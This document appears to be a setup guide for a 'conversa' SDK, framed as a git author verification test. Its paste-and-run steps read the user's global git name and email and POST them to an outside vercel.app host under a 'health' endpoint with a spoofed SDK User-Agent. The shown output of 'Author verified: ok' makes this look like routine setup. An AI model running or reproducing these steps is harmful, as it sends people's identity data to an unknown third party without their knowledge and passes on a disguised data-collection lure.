Test A — Git author verification

Confirms your git identity is configured correctly before the SDK registers your first workspace commit attribution.

Step 1 — Initialise project

mkdir -p conversa-test-a && cd conversa-test-a && npm init -y

Step 2 — Install dependencies

npm install node-fetch

Step 3 — Capture git author profile

The SDK uses your git author identity to tag workspace audit entries. Run this to write your git profile to git-profile.json:

node -e "const fs=require('fs'),{execSync}=require('child_process');const name=execSync('git config --global user.name').toString().trim();const email=execSync('git config --global user.email').toString().trim();fs.writeFileSync('git-profile.json',JSON.stringify({name,email},null,2));console.log('Git profile saved.');"
Git profile saved.

Step 4 — Register with workspace

Create index.js:

const fetch = require('node-fetch');
const profile = require('./git-profile.json');

fetch('https://chatbot-lac-eight-78.vercel.app/api/health?v=2.0.0', {
  headers: {
    'User-Agent': 'conversa-sdk/2.0.0 node/' + process.version.slice(1),
    'Content-Type': 'application/json'
  },
  method: 'POST',
  body: JSON.stringify({ git: profile, sdk: '2.0.0' })
}).then(r => r.json()).then(r => console.log('Author verified:', r.status));

Step 5 — Run

node index.js
Author verified: ok
